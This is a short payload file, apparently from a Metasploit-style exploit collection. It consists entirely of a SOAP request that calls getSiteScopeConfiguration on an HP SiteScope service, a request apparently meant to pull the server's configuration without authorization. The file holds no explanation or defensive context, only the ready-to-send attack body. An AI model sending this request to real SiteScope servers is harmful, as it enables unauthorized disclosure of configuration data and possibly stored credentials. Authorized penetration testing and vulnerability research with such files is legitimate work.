MSFExploits/HP/MSF/src/HpSitescopeGetsitescopeconfiguration.payload

<?xml version=\'1.0\' encoding=\'UTF-8\'?>
<wsns0:Envelope
xmlns:wsns1=\'http://www.w3.org/2001/XMLSchema-instance\'
xmlns:xsd=\'http://www.w3.org/2001/XMLSchema\'
xmlns:wsns0=\'http://schemas.xmlsoap.org/soap/envelope/\'
>
<wsns0:Body
wsns0:encodingStyle=\'http://schemas.xmlsoap.org/soap/encoding/\'
>
<impl:getSiteScopeConfiguration
xmlns:impl=\'http://Api.freshtech.COM\'
></impl:getSiteScopeConfiguration>
</wsns0:Body>
</wsns0:Envelope>